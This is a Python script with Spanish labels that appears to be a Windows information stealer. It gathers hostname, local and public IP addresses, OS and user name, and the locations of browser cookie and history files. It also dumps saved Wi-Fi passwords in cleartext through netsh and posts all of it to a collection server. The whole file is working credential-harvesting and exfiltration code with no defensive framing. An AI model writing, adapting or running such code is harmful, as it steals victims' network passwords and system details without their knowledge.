import socket
import requests
import platform
import getpass
import datetime
import subprocess
import json
import os
import base64

SERVER_URL = "http://localhost:5000"

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "No disponible"

def get_public_ip():
    try:
        ip = requests.get("https://api.ipify.org", timeout=5).text
        return ip
    except:
        return "No disponible"

def get_all_ips():
    ips = []
    hostname = socket.gethostname()
    ips.append(f"Hostname: {hostname}")
    ips.append(f"IP Local: {get_local_ip()}")
    ips.append(f"IP Publica: {get_public_ip()}")
    return ips

def get_system_info():
    info = []
    info.append(f"Sistema: {platform.system()} {platform.release()}")
    info.append(f"Usuario: {getpass.getuser()}")
    info.append(f"PC Name: {platform.node()}")
    info.append(f"Fecha: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    return info

def get_cookies():
    cookies_data = []
    
    chrome_path = os.path.join(os.getenv('LOCALAPPDATA', ''), 'Google', 'Chrome', 'User Data', 'Default', 'Network', 'Cookies')
    if os.path.exists(chrome_path):
        cookies_data.append(f"Chrome Cookies: {chrome_path}")
    
    ff_path = os.path.join(os.getenv('APPDATA', ''), 'Mozilla', 'Firefox', 'Profiles')
    if os.path.exists(ff_path):
        for profile in os.listdir(ff_path):
            cookies_path = os.path.join(ff_path, profile, 'cookies.sqlite')
            if os.path.exists(cookies_path):
                cookies_data.append(f"Firefox Cookies: {cookies_path}")
                break
    
    edge_path = os.path.join(os.getenv('LOCALAPPDATA', ''), 'Microsoft', 'Edge', 'User Data', 'Default', 'Network', 'Cookies')
    if os.path.exists(edge_path):
        cookies_data.append(f"Edge Cookies: {edge_path}")
    
    return cookies_data if cookies_data else ["Cookies: No encontrados"]

def get_wifi_passwords():
    try:
        result = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'], shell=True, text=True)
        networks = [line.split(':')[1].strip() for line in result.split('\n') if 'All User Profile' in line]
        passwords = []
        for network in networks[:5]:
            try:
                result = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', f'name={network}', 'key=clear'], shell=True, text=True)
                for line in result.split('\n'):
                    if 'Key Content' in line:
                        passwords.append(f"WiFi: {network} | Pass: {line.split(':')[1].strip()}")
            except:
                pass
        return passwords if passwords else ["WiFi: No encontrados"]
    except:
        return ["WiFi: No disponibles"]

def get_browsers_history():
    history = []
    
    chrome_history = os.path.join(os.getenv('LOCALAPPDATA', ''), 'Google', 'Chrome', 'User Data', 'Default', 'History')
    if os.path.exists(chrome_history):
        history.append(f"Chrome History: {chrome_history}")
    
    return history if history else ["History: No encontrada"]

def send_to_server():
    data = []
    data.append("=== CAPTURA DE INFO ===")
    data.extend(get_all_ips())
    data.append("")
    data.extend(get_system_info())
    data.append("")
    data.append("=== COOKIES ===")
    data.extend(get_cookies())
    data.append("")
    data.append("=== WIFI ===")
    data.extend(get_wifi_passwords())
    data.append("")
    data.append("=== HISTORIAL ===")
    data.extend(get_browsers_history())
    data.append("")
    data.append("=" * 30)
    
    info_text = "\n".join(data)
    
    try:
        requests.post(f"{SERVER_URL}/save", data={"info": info_text, "type": "windows"}, timeout=5)
        print("[OK] Datos enviados")
    except Exception as e:
        print(f"[ERROR] No se pudo enviar: {e}")

if __name__ == "__main__":
    send_to_server()
